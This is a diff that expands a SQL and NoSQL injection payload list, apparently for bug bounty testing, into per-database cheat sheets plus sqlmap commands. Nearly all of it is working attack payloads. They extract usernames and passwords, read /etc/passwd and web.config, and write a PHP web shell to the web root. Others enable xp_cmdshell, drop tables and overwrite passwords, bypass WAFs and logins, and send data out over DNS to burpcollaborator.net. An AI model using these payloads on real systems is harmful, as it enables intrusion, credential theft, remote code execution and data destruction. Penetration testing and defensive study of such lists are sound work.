@@ -1,71 +1,279 @@
-# SQLi Payloads
-# Categories: Error-based, Union, Boolean, Time-based, NoSQL, WAF Bypass
+# SQLi Payloads — Advanced Bug Bounty Edition
+# Sources: PayloadsAllTheThings, pentestmonkey, PortSwigger, real bug bounty writeups (2025-2026)
+# Categories: MySQL, PostgreSQL, MSSQL, Oracle, SQLite, NoSQL, WAF Bypass, Automation
 
-# === Error-Based ===
-'
-"
-%27
-%22
-\
-OR 1=1
-OR 1=1--
-OR '1'='1'
-OR "1"="1"
-' OR 1=1 --
-" OR 1=1 --
-admin'--
-admin' #
-' OR 1=1#
-' OR 1=1--
+# ============================================================
+# SECTION 1: DETECTION PROBES (DB Fingerprinting)
+# ============================================================
+# MySQL:
+' AND SLEEP(2) --
+' AND BENCHMARK(5000000,MD5('x')) --
+' /*!50000OR*/ 1=1 --
 
-# === Union-Based (column enumeration) ===
-' UNION SELECT 1 --
-' UNION SELECT 1,2 --
-' UNION SELECT 1,2,3 --
-' UNION SELECT 1,2,3,4 --
-' UNION SELECT NULL --
-' UNION SELECT NULL,NULL --
-' UNION SELECT NULL,NULL,NULL --
-' UNION ALL SELECT 1,2,3 --
-' UNION SELECT 1,2,3#
+# PostgreSQL:
+' AND PG_SLEEP(2) --
+' AND (SELECT 1 FROM PG_SLEEP(2)) --
+' AND 1::int=1 --
 
-# === Boolean-Based ===
+# MSSQL:
+' WAITFOR DELAY '0:0:2' --
 ' AND 1=1 --
-' AND 1=2 --
-' OR 1=1 --
-' OR 1=2 --
-' AND '1'='1
-' AND '1'='2
-%27%20AND%201%3D1%20--
-%27%20AND%201%3D2%20--
+' AND DB_NAME()='master' --
 
-# === Time-Based (MySQL) ===
-' AND SLEEP(5) --
-' AND SLEEP(10) --
-' OR SLEEP(5) --
-' OR SLEEP(10) --
-' AND BENCHMARK(5000000,MD5(1)) --
-' OR BENCHMARK(5000000,MD5(1)) --
+# Oracle:
+' AND 1=1 --
+' AND ROWNUM=1 --
+' AND 1=2 UNION SELECT NULL FROM DUAL --
 
-# === Time-Based (PostgreSQL) ===
-' AND PG_SLEEP(5) --
-' OR PG_SLEEP(5) --
-' AND (SELECT * FROM PG_SLEEP(5)) --
+# SQLite:
+' AND 1=1 --
+' AND strftime('%s','now')>0 --
 
-# === Time-Based (MSSQL) ===
-' WAITFOR DELAY '0:0:5' --
-' OR WAITFOR DELAY '0:0:5' --
-' AND WAITFOR DELAY '0:0:5' --
+# ============================================================
+# SECTION 2: MYSQL — FULL CHEATSHEET
+# ============================================================
 
-# === Out of Band (OOB) (MySQL) ===
+# --- Version / User / DB ---
+' UNION SELECT @@version,2,3 --
+' UNION SELECT user(),2,3 --
+' UNION SELECT database(),2,3 --
+' UNION SELECT @@hostname,2,3 --
+
+# --- Information Schema Enumeration ---
+' UNION SELECT schema_name,2,3 FROM information_schema.schemata --
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema='dbname' --
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users' --
+
+# --- Data Extraction ---
+' UNION SELECT username,password,3 FROM users --
+' UNION SELECT CONCAT(username,':',password),2,3 FROM users --
+' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '|'),2,3 FROM users --
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --
+
+# --- Error-Based (MySQL-specific) ---
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) --
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --
+
+# --- Time-Based ---
+' AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a',SLEEP(3),0) --
+' AND IF((SELECT COUNT(*) FROM users)>100,SLEEP(5),0) --
+' AND BENCHMARK(5000000,MD5(SUBSTRING((SELECT password FROM users LIMIT 1),1,5))) --
+
+# --- Out-of-Band (OOB) via DNS ---
 ' LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.burpcollaborator.net\\test')) --
+' SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3 INTO OUTFILE '\\\\burpcollaborator.net\\test' --
 
-# === Stacked Queries ===
-' DROP TABLE users --
+# --- Stacked Queries ---
 '; DROP TABLE users; --
-'; SELECT * FROM admin; --
+'; INSERT INTO admin VALUES('hacker','pass'); --
+'; UPDATE users SET password='hacked' WHERE id=1; --
+'; CREATE PROCEDURE... (RCE via UDF if FILE priv) --
 
-# === Authentication Bypass ===
+# --- File Operations (FILE privilege required) ---
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3 --
+' UNION SELECT '<?php system($_GET["c"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php' --
+' UNION SELECT '<?php system($_GET["c"]); ?>',2,3 INTO DUMPFILE '/var/www/html/shell.php' --
+
+# --- WAF Bypass (MySQL) ---
+# Inline comments:
+UNION/**/SELECT/**/1,2,3 --
+OR/**/1=1 --
+# Case variation:
+OR 1=1 --
+oR 1=1 --
+AnD 1=1 --
+# Hex encoding:
+0x27204f5220313d312d2d (decoded: ' OR 1=1 --)
+# Double URL encoding:
+%2527%2520OR%25201%253D1%2520--
+# Comment wrapping:
+/*!OR*/ 1=1 --
+/*!UNION*/ /*!SELECT*/ 1,2,3 --
+# HPP (HTTP Parameter Pollution):
+?id=1&id=2&id=3 UNION SELECT 1,2,3--
+# Null byte:
+' OR 1=1 -- %00
+' UNION SELECT 1,2,3 -- %00
+# Tab/Return instead of spaces:
+'%09OR%091%3D1%09--
+'%0AUNION%0ASELECT%0A1,2,3--
+
+# ============================================================
+# SECTION 3: POSTGRESQL — FULL CHEATSHEET
+# ============================================================
+
+# --- Version / User / DB ---
+' UNION SELECT version(),2,3 --
+' UNION SELECT current_user,2,3 --
+' UNION SELECT current_database(),2,3 --
+' UNION SELECT inet_server_addr(),2,3 --
+' UNION SELECT inet_server_port(),2,3 --
+
+# --- Schema Enumeration ---
+' UNION SELECT datname,2,3 FROM pg_database --
+' UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public' --
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT table_name,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_schema NOT IN ('pg_catalog','information_schema') GROUP BY table_name --
+
+# --- Data Extraction ---
+' UNION SELECT username,password,3 FROM users --
+' UNION SELECT string_agg(username,','),string_agg(password,','),3 FROM users --
+' UNION SELECT encode(cast(password as bytea),'hex'),2,3 FROM users --  (if password is hash)
+
+# --- File Read (superuser) ---
+' UNION SELECT pg_read_file('/etc/passwd',0,10000),2,3 --
+
+# --- Time-Based ---
+' AND (SELECT PG_SLEEP(5)) --
+' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END) --
+' AND (SELECT 1 FROM PG_SLEEP(5)) --
+
+# --- Error-Based ---
+' AND 1=CAST((SELECT version()) AS int) --  (will error with version)
+
+# --- Stacked Queries ---
+'; DROP TABLE IF EXISTS users CASCADE; --
+'; CREATE TABLE hack(data text); -- 
+
+# --- WAF Bypass ---
+UNION/**/SELECT/**/1,2,3--
+OR/**/1=1--
+'/*/OR/*/1=1/*/--
+
+# ============================================================
+# SECTION 4: MSSQL — FULL CHEATSHEET
+# ============================================================
+
+# --- Version / User / DB ---
+' UNION SELECT @@version,2,3 --
+' UNION SELECT SYSTEM_USER,2,3 --
+' UNION SELECT DB_NAME(),2,3 --
+' UNION SELECT HOST_NAME(),2,3 --
+' UNION SELECT USER_NAME(),2,3 --
+
+# --- Schema Enumeration ---
+' UNION SELECT name,2,3 FROM master..sysdatabases --
+' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U' --
+' UNION SELECT name,2,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') --
+' UNION SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES --
+' UNION SELECT COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' --
+
+# --- Data Extraction ---
+' UNION SELECT username,password,3 FROM users --
+' UNION SELECT username+':'+password,2,3 FROM users --
+
+# --- Time-Based ---
+'; WAITFOR DELAY '0:0:5' --
+' AND WAITFOR DELAY '0:0:5' --
+' IF 1=1 WAITFOR DELAY '0:0:5' --
+' IF (SELECT COUNT(*) FROM users)>100 WAITFOR DELAY '0:0:5' --
+
+# --- Error-Based ---
+' AND 1=CONVERT(int,@@version) --
+' AND 1=CONVERT(int,(SELECT @@version)) --
+
+# --- Stacked Queries ---
+'; EXEC xp_cmdshell 'whoami'; --
+'; EXEC xp_cmdshell 'dir C:\'; -- 
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+# --- File Operations ---
+'; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'; --
+'; CREATE TABLE files(data varchar(max)); BULK INSERT files FROM 'C:\inetpub\wwwroot\web.config'; SELECT * FROM files; --
+
+# --- WAF Bypass ---
+WAITFOR/**/DELAY/**/'0:0:5' --
+UNION/**/SELECT/**/1,2,3--
+DECLARE @s NVARCHAR(4000);SET @s='SELECT 1 UNION SELECT 2';EXEC(@s)--
+
+# ============================================================
+# SECTION 5: ORACLE — FULL CHEATSHEET
+# ============================================================
+
+# Note: Oracle requires FROM DUAL when not selecting from a real table
+
+# --- Version / User / DB ---
+' UNION SELECT banner,NULL FROM v$version --
+' UNION SELECT user,NULL FROM dual --
+' UNION SELECT global_name,NULL FROM global_name --
+' UNION SELECT instance_name,NULL FROM v$instance --
+
+# --- Schema Enumeration ---
+' UNION SELECT username,NULL FROM all_users ORDER BY username --
+' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SYSTEM' --
+' UNION SELECT column_name,NULL FROM all_tab_cols WHERE table_name='USERS' --
+' UNION SELECT owner||':'||table_name,NULL FROM all_tables --
+
+# --- Data Extraction ---
+' UNION SELECT username||':'||password,NULL FROM users --
+
+# --- Time-Based ---
+' AND 1=2 UNION SELECT dbms_pipe.receive_message('x',10),NULL FROM dual --
+' AND (SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE rownum=1),1,1)='a' THEN dbms_pipe.receive_message('x',10) ELSE NULL END FROM dual) IS NOT NULL --
+
+# --- Error-Based ---
+' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE rownum=1)) --
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)) --
+
+# --- XML-Based Error ---
+' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>'),'/l') FROM dual --
+
+# --- Stacked Queries (limited in Oracle) ---
+' BEGIN DBMS_LOCK.SLEEP(5); END; --
+
+# ============================================================
+# SECTION 6: SQLITE — CHEATSHEET
+# ============================================================
+
+# --- Version ---
+' UNION SELECT sqlite_version(),2,3 --
+
+# --- Schema Enumeration ---
+' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --
+' UNION SELECT sql,2,3 FROM sqlite_master WHERE name='users' --
+' UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table' --
+
+# --- Data Extraction ---
+' UNION SELECT username,password,3 FROM users --
+
+# ============================================================
+# SECTION 7: NOSQL INJECTION (MongoDB)
+# ============================================================
+
+# --- Authentication Bypass ---
+username[$ne]=admin&password[$ne]=test
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$gt": ""}
+{"$ne": ""}
+
+# --- Data Extraction via $regex ---
+username[$regex]=.*&password[$regex]=.*
+{"username": {"$regex": "admin"}, "password": {"$gt": ""}}
+{"username": {"$regex": "^a"}, "password": {"$gt": ""}}  # brute force char by char
+
+# --- NoSQL Time-Based ---
+{"$where": "sleep(5000)"}
+{"$where": "this.password.length > 0"}
+{"$where": "this.username.match(/^a.*$/)"}
+
+# --- NoSQL POST/JSON Injection ---
+# JSON body:
+#   {"username": {"$gt": ""}, "password": {"$gt": ""}}
+# URL-encoded POST:
+#   username[$ne]=null&password[$ne]=null
+#   username[$regex]=.*&password[$regex]=.*
+
+# --- NoSQL Error-Based ---
+{$ne: 1}
+{$regex: ".*"}
+{$nin: []}
+
+# ============================================================
+# SECTION 8: AUTHENTICATION BYPASS — UNIVERSAL
+# ============================================================
 admin' --
 admin' #
 admin'/*
@@ -73,23 +281,47 @@ admin'/*
 ' OR '1'='1'--
 ' OR '1'='1'#
 admin' OR '1'='1
+admin' OR '1'='1'--
 admin" OR "1"="1
+admin') OR ('1'='1
+admin' OR 1=1--
+admin' OR NULL--
+# NoSQL:
+username[$ne]=test&password[$ne]=test
 
-# === NoSQL Injection (MongoDB) ===
-' || 1==1 //
-' || 1==1%00
-admin' || 1==1 //
-{"$gt": ""}
-{"$ne": ""}
-username[$ne]=admin&password[$ne]=test
-username[$regex]=.*&password[$regex]=.*
-
-# === WAF Bypass ===
-/*!50000OR*/ 1=1 --
-ANd 1=1 --
-OR 1=1 --
-UNION/**/SELECT/**/1,2,3 --
-/**/OR/**/1=1 --
-%25%32%37 OR 1=1 --
-%c0%27 OR 1=1 --
-´ OR 1=1 --
+# ============================================================
+# SECTION 9: SQLMAP AUTOMATION
+# ============================================================
+# Basic:
+#   sqlmap -u "http://target.com/page?id=1" --batch
+# With cookie/auth:
+#   sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --batch
+# POST data:
+#   sqlmap -u "http://target.com/page" --data="username=admin&password=test" --batch
+# Second-order injection:
+#   sqlmap -r request.txt --second-order "http://target.com/profile" --batch
+# OS Shell (if DBA):
+#   sqlmap -u "http://target.com/page?id=1" --os-shell
+# SQL Shell (direct SQL):
+#   sqlmap -u "http://target.com/page?id=1" --sql-shell
+# Crawl:
+#   sqlmap -u "http://target.com/" --crawl=2 --batch
+# TOR:
+#   sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5
+# Proxy:
+#   sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
+# Tamper scripts (WAF bypass):
+#   sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=between --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=charencode --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=apostrophemask --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=bluecoat --batch
+#   sqlmap -u "http://target.com/page?id=1" --tamper=halfversionedmorekeywords --batch
+# Delay / safe:
+#   sqlmap -u "http://target.com/page?id=1" --delay=2 --safe-url "http://target.com/" --safe-freq=10
+# Verbosity (to see payloads):
+#   sqlmap -u "http://target.com/page?id=1" -v 3 --batch
+# Headers injection:
+#   sqlmap -u "http://target.com/" --headers="User-Agent: *" --batch
+#   sqlmap -u "http://target.com/" --headers="X-Forwarded-For: *" --batch
